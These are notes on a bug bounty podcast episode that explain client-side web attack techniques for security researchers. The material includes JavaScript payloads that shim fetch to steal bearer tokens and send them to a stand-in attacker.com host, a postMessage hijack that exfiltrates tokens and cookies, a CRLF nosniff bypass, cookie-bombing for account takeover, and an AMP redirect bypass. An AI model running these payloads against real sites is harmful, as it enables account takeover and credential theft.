# EP36: Live Hacking Event Debrief & Q&A - Client-Side Security Notes

## Metadata
- **Guests:** Justin Gardner (@rhynorater), Joel Margolis (teknogeek)
- **Date:** ~March 2024 (recorded around HackerOne Live Hacking Event in Tokyo targeting PayPal)
- **Episode Link:** Critical Thinking Bug Bounty Podcast - Episode 36
- **Context:** Casual Q&A episode recorded during a live hacking event. Contains several high-value client-side techniques discussed between the two main hosts.

---

## Technique 1: Google AMP Open Redirect for Chaining

When an application restricts open redirects to only allow specific trusted domains (e.g., `google.com` and `target.com`), Google's AMP infrastructure provides a built-in redirect that can bypass this restriction.

### How It Works

1. Target application has an open redirect parameter but validates the destination domain.
2. Allowlist only permits trusted domains like `google.com` and `target.com`.
3. Attacker uses Google's AMP redirect URL which is on the trusted `google.com` domain.
4. Google AMP redirects the user to an arbitrary external domain.

```
Step-by-step:

Victim clicks:
  https://target.com/redirect?url=https://google.com/amp/s/evil.com

                    Target App                Google AMP             Attacker
                    ---------                 ----------             --------
Victim ------>  /redirect?url=google.com/amp/s/evil.com
                        |
                        | (allowlist check: "google.com" --> PASS)
                        |
                        +-------> https://google.com/amp/s/evil.com
                                          |
                                          | (AMP page not found on desktop)
                                          | (browser gets redirected)
                                          |
                                          +---------> https://evil.com
                                                          |
                                                      Attacker controls
                                                      this page (phishing,
                                                      token theft, etc.)
```

### The Redirect URL

```
https://google.com/amp/s/<target-domain>
```

Example:
```
https://google.com/amp/s/evil.com
```

### Why This Works

- Google AMP (Accelerated Mobile Pages) is designed to serve cached mobile-friendly versions of web pages.
- On **desktop browsers**, when Google cannot find an AMP version of the page, it redirects the user to the original URL. This is the behavior exploited here.
- On **mobile browsers** (with mobile user agent), AMP tries to actually render the page, so the redirect behavior may differ. The redirect is primarily effective on desktop.
- Google considers this behavior intentional and does not patch it, making it a reliable primitive.

### Where To Apply This

- Any open redirect that allowlists `google.com` as a trusted redirect destination.
- Chaining with OAuth flows where `redirect_uri` validation permits Google domains.
- Phishing chains where you need to bounce through a trusted domain to maintain victim trust.
- Escalating open redirects into token theft when OAuth callbacks only allow whitelisted domains.

---

## Technique 2: Duplicate X-Content-Type-Options Header Bypass via CRLF Injection

When exploiting a CRLF injection to achieve XSS, the `X-Content-Type-Options: nosniff` header can block content type sniffing. Injecting a second, invalid instance of this header causes Chrome to discard both, re-enabling sniffing.

### How It Works

1. Attacker has a CRLF injection in a response (e.g., in the URL path reflected into a response header).
2. The response already contains `X-Content-Type-Options: nosniff`.
3. The `Content-Type` header cannot be set to `text/html` because the injection point is in the path and slashes (`/`) are not allowed.
4. With a blank or missing `Content-Type`, the browser would normally sniff the content -- but `nosniff` prevents this.
5. Attacker injects a second `X-Content-Type-Options` header with an invalid value.
6. Chrome sees two conflicting `X-Content-Type-Options` headers and discards the directive entirely.
7. Browser falls back to content sniffing, detects HTML, and renders the injected payload as HTML/XSS.

```
Original response (simplified):
---------------------------------
HTTP/1.1 200 OK
Content-Type:                          <-- blank, cannot inject text/html (no slash allowed)
X-Content-Type-Options: nosniff        <-- blocks sniffing, prevents XSS
...body with injected HTML...


After CRLF injection:
---------------------------------
HTTP/1.1 200 OK
Content-Type:
X-Content-Type-Options: nosniff        <-- original header
X-Content-Type-Options: INVALID_VALUE  <-- injected via CRLF
Content-Length: 150                     <-- injected via CRLF

<script>alert(document.domain)</script> <-- injected body
```

```
Attack flow:

  Attacker crafts URL with CRLF payload in path
       |
       v
  Server reflects path into response headers
       |
       v
  Response now has TWO X-Content-Type-Options headers:
    1. "nosniff" (original)
    2. "INVALID_VALUE" (injected)
       |
       v
  Chrome sees conflicting headers --> DISCARDS BOTH
       |
       v
  Content-Type is blank --> Chrome sniffs the body
       |
       v
  Body contains HTML --> Rendered as HTML --> XSS fires
```

### Why This Works

- The `X-Content-Type-Options` header is a client-side (browser-enforced) security control.
- When Chrome encounters two instances of the same header with conflicting values, it does not know which to trust and abandons enforcement entirely.
- This is a browser implementation quirk -- the spec does not clearly define behavior for duplicate security headers with conflicting values.
- With `nosniff` effectively disabled and `Content-Type` blank, the browser reverts to MIME sniffing, which will detect and render HTML content.

### Where To Apply This

- Any CRLF injection where you control response headers but cannot set `Content-Type` to `text/html` (e.g., slash character is filtered).
- Targets that rely on `X-Content-Type-Options: nosniff` as a defense against CRLF-to-XSS escalation.
- Test other security headers for the same duplicate-header bypass behavior (e.g., `X-Frame-Options`, `Content-Security-Policy` -- though CSP has defined merging rules).
- Primarily confirmed in Chrome/Chromium-based browsers.

---

## Technique 3: Fetch/XHR Shimming to Steal Bearer Tokens from XSS

When exploiting XSS on a single-page application that stores auth tokens in JavaScript memory (not in cookies or localStorage), overwriting `window.fetch` allows interception of the authorization header without needing to locate the token in minified JavaScript state.

### How It Works

1. SPA uses Axios or Fetch with `Authorization: Bearer <token>` header for API calls.
2. Token is stored in JavaScript runtime state (e.g., React state, Vuex store, closure variable) -- not in cookies or localStorage.
3. Attacker has XSS but cannot easily extract the token from minified JS state objects.
4. Attacker creates a same-origin iframe, then overwrites `window.fetch` inside it before the iframe's app code initializes.
5. The shimmed fetch function intercepts all outgoing requests, checks for the `Authorization` header, and exfiltrates the bearer token.

```javascript
// XSS payload: Shim fetch inside a same-origin iframe to steal Bearer tokens

// Step 1: Create a same-origin iframe
var iframe = document.createElement('iframe');
iframe.src = '/';  // same-origin page that will trigger API calls on load
document.body.appendChild(iframe);

iframe.onload = function() {
    // Step 2: Save reference to the original fetch
    var originalFetch = iframe.contentWindow.fetch;

    // Step 3: Overwrite fetch with our shimmed version
    iframe.contentWindow.fetch = function(url, options) {
        // Step 4: Check if the request includes an Authorization header
        if (options && options.headers) {
            var authHeader = null;

            // Handle Headers object
            if (options.headers instanceof Headers) {
                authHeader = options.headers.get('Authorization');
            }
            // Handle plain object
            else if (options.headers['Authorization']) {
                authHeader = options.headers['Authorization'];
            }

            // Step 5: If Bearer token found, exfiltrate it
            if (authHeader && authHeader.startsWith('Bearer ')) {
                var token = authHeader.split(' ')[1];
                // Send token to attacker server
                new Image().src = 'https://attacker.com/steal?token='
                    + encodeURIComponent(token);
            }
        }

        // Step 6: Call the original fetch so the app works normally
        //         (victim doesn't notice anything wrong)
        return originalFetch.apply(this, arguments);
    };
};
```

```
Attack flow:

  XSS fires on target.com
       |
       v
  Create <iframe src="/"> (same-origin)
       |
       v
  iframe loads --> app initializes inside iframe
       |
       v
  BEFORE app makes API calls:
  Overwrite iframe.contentWindow.fetch with shim
       |
       v
  App inside iframe calls fetch() with Authorization header
       |
       +---> Shim intercepts: extracts "Bearer <token>"
       |         |
       |         +---> Exfil to attacker.com/steal?token=...
       |
       +---> Original fetch() still executes (app works normally)
       |
       v
  Attacker now has the Bearer token --> Account Takeover
```

### Why This Works

- JavaScript allows overwriting most properties on the `window` object, including `fetch`, `XMLHttpRequest`, and other built-in APIs.
- Same-origin iframes share the same origin, so the parent page (where XSS runs) has full access to the iframe's `contentWindow`.
- The app inside the iframe will use the shimmed fetch transparently -- it has no way to detect the override.
- This avoids the need to: (a) traverse complex minified React/Vue state trees to find the token, or (b) replay complex OAuth flows with cryptographic nonce generation.

### Where To Apply This

- Any XSS on an SPA that uses Bearer token authentication stored in JS state.
- Applications using Axios, Fetch API, or custom HTTP clients with in-memory token storage.
- Can also shim `XMLHttpRequest.prototype.setRequestHeader` for apps using XHR instead of fetch.
- Useful in JavaScript sandbox escape scenarios where overwriting globals can break out of the sandbox.
- The same technique works for intercepting any sensitive data in outgoing requests (API keys, CSRF tokens, custom headers).

---

## Technique 4: postMessage Exploitation via Iframe Override URL Parameter

When an application uses iframes with postMessage for cross-origin communication and exposes a URL override parameter (e.g., for dev/staging environments), an attacker can inject their own iframe and receive authentication tokens or trigger privileged actions.

### How It Works

1. Mobile app API response reveals a `.html` endpoint with configuration URLs and iframe embed logic.
2. The main web application embeds this endpoint in an iframe and uses postMessage to pass authentication tokens.
3. The iframe source URL is controlled by a parameter (e.g., `overrideUrl`) intended for switching between dev/staging/production environments.
4. The parameter validation only checks for specific known values (e.g., "local") but falls through to the user-supplied value for anything else.
5. Attacker sets the override parameter to their own server URL.
6. Their malicious page is loaded in the iframe and receives postMessage events from the parent, including auth tokens.
7. Additional postMessage commands (e.g., `goTo` triggering `window.location = ...`) provide secondary XSS.

```
Attack flow:

  Attacker crafts URL:
  https://target.com/page?overrideUrl=https://evil.com/steal.html
       |
       v
  Target app loads, creates iframe:
  <iframe src="https://evil.com/steal.html">   <-- attacker controlled!
       |
       v
  Parent sends postMessage to iframe:
  { action: "authenticate", token: "Bearer eyJ..." }
       |
       v
  evil.com/steal.html receives the message:
       |
       +---> Exfiltrates auth token --> Account Takeover
       |
       v
  Attacker can also send postMessage BACK to parent:
  { action: "goTo", url: "javascript:alert(document.domain)" }
       |
       v
  Parent executes: window.location = "javascript:..."  --> XSS
```

```javascript
// Attacker's page hosted at evil.com/steal.html

// Listen for postMessage from the parent (target.com)
window.addEventListener('message', function(event) {
    // Receive auth token sent by parent
    if (event.data && event.data.token) {
        // Exfiltrate the token
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({
                token: event.data.token,
                origin: event.origin
            })
        });
    }
});

// Send commands back to the parent window
// The parent has a handler that does window.location = url
// for a "goTo" action -- this gives us XSS
parent.postMessage({
    action: 'goTo',
    url: 'javascript:document.location="https://attacker.com/?c="+document.cookie'
}, '*');
```

### Why This Works

- Developer/staging environment parameters are often left in production code with insufficient validation.
- The iframe override only checked for known keywords (like "local") but used user input as-is for anything else -- classic allowlist-that-is-actually-a-denylist pattern.
- postMessage communication between parent and iframe is designed to pass sensitive data (auth tokens) -- hijacking the iframe hijacks that data flow.
- The `goTo` command blindly passing user input to `window.location` is a textbook DOM XSS sink.
- Mobile app API responses can reveal hidden endpoints and configuration that are not visible in the web UI.

### Where To Apply This

- Look for iframe embed URLs in mobile app API responses -- these often reveal hidden/legacy functionality.
- Search for URL override parameters (`overrideUrl`, `env`, `baseUrl`, `apiUrl`, `redirectUrl`) in any page that loads iframes.
- Audit postMessage handlers for actions that perform navigation (`window.location`, `location.assign`, `location.replace`) or DOM manipulation.
- Check `.html` endpoints returned in API config responses -- raw HTML files often indicate legacy or less-audited code.
- Mobile app config endpoints frequently expose internal URLs, staging environments, and debug parameters.

---

## Technique 5: Cookie Prioritization + Cookie Bombing for Session Fixation ATO

By combining XSS on any subdomain, cookie path prioritization rules, and cookie bombing, an attacker can fixate a password reset session and take over an account.

### How It Works

1. Attacker has XSS on any subdomain of the target (e.g., `anything.target.com`).
2. From XSS, attacker sets a malicious password-reset session cookie scoped to `.target.com` with a very specific path (e.g., `/login` or `/reset-password`).
3. Browser cookie prioritization rule: cookies with a more specific path are sent first in the `Cookie` header, regardless of which subdomain set them.
4. Attacker also cookie-bombs the `/login` path -- sets many large cookies scoped to that path, inflating the `Cookie` header beyond server limits.
5. When the victim visits `/login`, the oversized cookie header causes the server to reject the request (413 Request Entity Too Large or similar), returning "invalid password."
6. Victim cannot log in, so they initiate a password reset flow.
7. During the password reset flow, the attacker's fixated session cookie (set with the specific path for the reset endpoint) takes priority over the legitimate session cookie.
8. The server associates the password reset flow with the attacker's fixated session.
9. Attacker uses the same fixated session to visit the "set new password" page and sets the password before the victim does.
10. Attacker now knows the password and logs in as the victim.

```
Attack chain (5 stages):

STAGE 1: Cookie Injection via Subdomain XSS
============================================
  XSS on sub.target.com
       |
       v
  document.cookie = "reset_session=ATTACKER_TOKEN; domain=.target.com; path=/reset-password"
  document.cookie = "bomb1=AAAA...4KB...; domain=.target.com; path=/login"
  document.cookie = "bomb2=AAAA...4KB...; domain=.target.com; path=/login"
  document.cookie = "bomb3=AAAA...4KB...; domain=.target.com; path=/login"
  ... (repeat until total cookie size exceeds server header limit)


STAGE 2: Login Denial via Cookie Bomb
======================================
  Victim visits https://www.target.com/login
       |
       v
  Browser sends ALL cookies for .target.com + path=/login:
  Cookie: bomb1=AAAA...4KB; bomb2=AAAA...4KB; bomb3=AAAA...4KB; ...
       |
       v
  Server: "Cookie header too large" --> returns error
       |
       v
  Victim sees: "Invalid password" or "Login failed"
       |
       v
  Victim thinks: "My password must be wrong, let me reset it"


STAGE 3: Session Fixation on Reset Flow
========================================
  Victim clicks "Forgot Password" --> goes to /reset-password
       |
       v
  Browser sends cookies for .target.com + path=/reset-password:
  Cookie: reset_session=ATTACKER_TOKEN; real_session=LEGIT_TOKEN
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         Attacker's cookie sent FIRST (more specific path match)
         Server uses FIRST cookie value --> attacker's session wins
       |
       v
  Server associates this password reset flow with ATTACKER_TOKEN


STAGE 4: Race to Set Password
==============================
  Victim receives reset email, clicks link, reaches "Set New Password" page
       |
       v
  Meanwhile, attacker is monitoring and has the same ATTACKER_TOKEN
       |
       v
  Attacker visits /reset-password/set-new-password with ATTACKER_TOKEN
       |
       v
  Attacker sets password to "attacker123" BEFORE victim submits form


STAGE 5: Account Takeover
==========================
  Attacker logs in with victim's email + "attacker123"
       |
       v
  Full account access --> ATO complete
```

### Cookie Path Prioritization Rule

```
Cookies with MORE specific paths are sent FIRST in the Cookie header.

Example:
  Cookie A: name=session; domain=.target.com; path=/
  Cookie B: name=session; domain=.target.com; path=/reset-password

When visiting /reset-password:
  Cookie header: session=B_VALUE; session=A_VALUE
                 ^^^^^^^^^^^^^^^^
                 More specific path = sent first = server uses this one
```

### Why This Works

- **Cookie scoping:** Any subdomain XSS can set cookies for the parent domain (`.target.com`), affecting all subdomains and the main domain.
- **Path prioritization:** RFC 6265 specifies that cookies with longer (more specific) paths should be listed first. Most servers use the first cookie value when duplicates exist.
- **Cookie bombing:** Servers have header size limits (typically 8KB-16KB). Inflating the cookie header beyond this limit causes request failures, which the application often surfaces as generic login errors.
- **Session fixation:** If the password reset flow uses a session identifier stored in a cookie and does not regenerate it after email verification, an attacker-supplied session persists through the entire flow.
- **Race condition:** The attacker and victim share the same reset session, so whoever submits the new password form first wins.

### Where To Apply This

- Any target with XSS on any subdomain (even low-impact subdomains become critical with this chain).
- Applications where password reset uses cookie-based session tracking.
- Login flows that do not clearly distinguish between "wrong password" and "server error."
- Programs where cookie scope is broad (`.target.com` rather than specific subdomain scoping).
- Check if `SameSite` attributes or `__Host-` cookie prefixes prevent cross-subdomain cookie injection.
- Use the Burp extension **Request Minimizer** to identify which cookies are actually used for session management.

---

## Technique 6: CORS Misconfiguration -- Access-Control-Allow-Origin: * with Credentials

A non-exploitable but frequently reported misconfiguration where `Access-Control-Allow-Origin: *` is set alongside `Access-Control-Allow-Credentials: true`.

### How It Works

```
Response headers:
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true

Theory:
  - Allow-Origin: * means any origin can read the response
  - Allow-Credentials: true means cookies/auth are sent with the request
  - Combined: any attacker site could read authenticated responses

Reality:
  - Browser spec BLOCKS this combination
  - If both are present, the browser throws an error
  - Credentials are NOT sent and the response is NOT readable
  - This is NOT exploitable in any modern browser
```

### Why This Does NOT Work

- The CORS specification explicitly prohibits `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`.
- Browsers enforce this at the spec level -- the request either fails or credentials are stripped.
- This is a misconfiguration (the headers contradict each other) but has zero exploitable impact.

### Where To Apply This (As a Reporter)

- Report transparently: state it is a misconfiguration but not currently exploitable.
- Could be informative for defense-in-depth (one config change away from being exploitable if the wildcard is changed to reflect the Origin header).
- Do not overstate severity -- per the podcast discussion, this is ethically questionable if reported as exploitable.
- Older or non-standard browsers *might* handle this differently, but no confirmed exploitation in modern browsers.

---

## Technique 7: JavaScript URL in Anchor Tags with target="_blank"

An injection of a `javascript:` URI into an `<a>` tag that has `target="_blank"` set.

### How It Works

```html
<!-- Injected/controlled markup -->
<a href="javascript:alert(1)" target="_blank">Click me</a>

<!-- When clicked: -->
<!-- Browser DOES NOT execute the javascript: URI -->
<!-- Because target="_blank" opens a new tab/window -->
<!-- and javascript: URIs don't execute in new browsing contexts -->
```

### Why This Does NOT Work

- Browsers do not execute `javascript:` URIs when the navigation target is `_blank` (new window/tab).
- The `javascript:` protocol requires execution in the current browsing context.
- This is a browser security restriction, not application-level defense.

### Where To Apply This (Assessment)

- If the `target="_blank"` attribute is dynamically added or could be removed, the XSS becomes exploitable -- one attribute removal away.
- Report transparently noting the current non-exploitability.
- Check if any code path renders the same URL in an anchor tag without `target="_blank"`.
- Check if the same URL value is used elsewhere (e.g., `window.location`, `iframe.src`, `location.assign`) where `javascript:` URIs would execute.

---

## Technique 8: Mobile App Proxy Interception via ADB Reverse Tunnel

Setting up traffic interception for mobile applications using ADB port forwarding instead of network-level proxy configuration.

### How It Works

```bash
# Step 1: Connect device via USB or start emulator
# Ensure ADB debugging is enabled on the device

# Step 2: Create reverse TCP tunnel from device to host
adb reverse tcp:8080 tcp:8080
# This means: device port 8080 --> host port 8080 (where Burp listens)

# Step 3: On the mobile device, set Wi-Fi proxy:
#   Host: 127.0.0.1
#   Port: 8080
# Traffic goes to localhost:8080 on device --> tunneled to host:8080 via ADB

# Step 4: Install Burp CA cert
# Navigate to http://127.0.0.1:8080 in device browser
# Download CA cert from top-right button
# Rename .der to .cer or .crt
# Settings > Security > Trusted credentials > Install CA cert

# Step 5: For apps with cert pinning, use Frida:
# Joel's "universal" SSL unpinning script (referenced in EP14)
# Works ~98% of the time
```

### Why This Works

- ADB reverse tunneling avoids all network configuration issues (no need to be on the same Wi-Fi, no IP address changes, no network restrictions).
- The device thinks it is talking to `127.0.0.1` -- the tunnel transparently routes to the host machine.
- More reliable than network-level proxy configuration, especially in corporate or restricted network environments.

### Where To Apply This

- Any mobile application security testing.
- When network proxy configuration is unreliable or blocked.
- Combined with Frida SSL unpinning for apps implementing certificate pinning.
- Use the intercepted traffic to discover hidden API endpoints, config URLs, and iframe embed URLs that may reveal web-based attack surface (as demonstrated in Technique 4).

---

## Key Quotes

> "If you have two nosniff content type options headers, one of them with an invalid value, one of them with a valid value, Chrome just throws the whole thing out the window." -- Justin Gardner, on the duplicate X-Content-Type-Options bypass

> "I just reached into that iframe and overwrote the fetch function, the window.fetch. And I just put my own function in there. I shimmed it... anytime they call fetch, call my function and then call fetch. And if that function call has the authorization bearer header in it, then exfil it to the attacker server." -- Justin Gardner, on fetch shimming for token theft

> "Post message bugs are so much fun. We talk about them all the time on the pod, but they're essentially APIs for your browser tabs, essentially. And why would you not want to remotely interact with a browser tab?" -- Justin Gardner

> "I cookie bomb the password reset flow... when they go to login, if you cookie bomb that specific path, then the request will fail because the header size is inflated because of all the cookies... then they're gonna reset their password." -- Justin Gardner, on the cookie bombing ATO chain

> "Google has a built-in open redirect that they don't patch that is just a part of functionality for Google. That is google.com/amp/s/ and then your target domain." -- Justin Gardner

> "The way that cookies work in the browser, if you put a cookie at a more specific path than another cookie, even if the domain is wider, that cookie will be prioritized when it is sent to the server." -- Justin Gardner, on cookie path prioritization

---

## Resources & References

| Resource | Description |
|----------|-------------|
| `google.com/amp/s/<domain>` | Google AMP open redirect (desktop only) |
| Request Minimizer (Burp Extension) | Automatically strips unnecessary parts of HTTP requests to identify essential cookies/headers |
| Frida SSL Unpinning Script (Joel's) | Universal cert pinning bypass, referenced in EP14 |
| `adb reverse tcp:8080 tcp:8080` | ADB reverse tunnel for mobile proxy setup |
| Critical Thinking EP14 | Deep dive on mobile hacking and Frida SSL pinning bypass |
| RFC 6265 | Cookie specification defining path-based prioritization behavior |

---

## Master Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | Google AMP Open Redirect Chain | Open Redirect Bypass | Medium (chain to token theft) | Low |
| 2 | Duplicate X-Content-Type-Options Header Bypass | XSS (via CRLF) | High (full XSS) | Medium |
| 3 | Fetch Shimming for Bearer Token Theft | XSS Post-Exploitation | Critical (ATO) | Low |
| 4 | postMessage Iframe Override URL Exploitation | postMessage + DOM XSS | Critical (ATO + XSS) | Medium |
| 5 | Cookie Prioritization + Cookie Bombing ATO | Session Fixation / ATO | Critical (ATO) | High |
| 6 | CORS Wildcard + Credentials (Non-Exploitable) | Misconfiguration | None (informational) | N/A |
| 7 | javascript: URI in target="_blank" Anchor (Non-Exploitable) | Injection (blocked) | None (one change away from XSS) | N/A |
| 8 | ADB Reverse Tunnel Mobile Proxy | Testing Setup | N/A (tooling) | Low |
